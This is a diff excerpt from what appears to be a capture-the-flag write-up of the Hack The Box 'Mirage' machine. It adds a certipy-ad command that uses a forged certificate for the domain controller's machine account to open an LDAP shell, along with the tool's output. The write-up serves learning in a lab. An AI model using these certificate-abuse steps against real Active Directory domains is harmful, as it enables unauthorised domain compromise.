@@ -911,8 +911,25 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 Then ill reset the UPN back to the original using the TGT for `mirage-service$`
 
 ```python
+❯❯❯ faketime -f +7h certipy-ad auth -pfx 'dc01.pfx' -dc-ip '10.129.232.163' -ldap-shell
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
+[*] Certificate identities:
+[*]     SAN UPN: 'dc01$@mirage.htb'
+[*]     Security Extension SID: 'S-1-5-21-2127163471-3824721834-2568365109-1109'
+[*] Connecting to 'ldaps://10.129.232.163:636'
+[*] Authenticated to '10.129.232.163' as: 'u:MIRAGE\\DC01$'
+Type help for list of commands
+
+# whoami
+u:MIRAGE\DC01$
+
+# 
 ```
+
+Then i can drop into an LDAP shell as the `dc01$` machine account
+
+
 
 
 
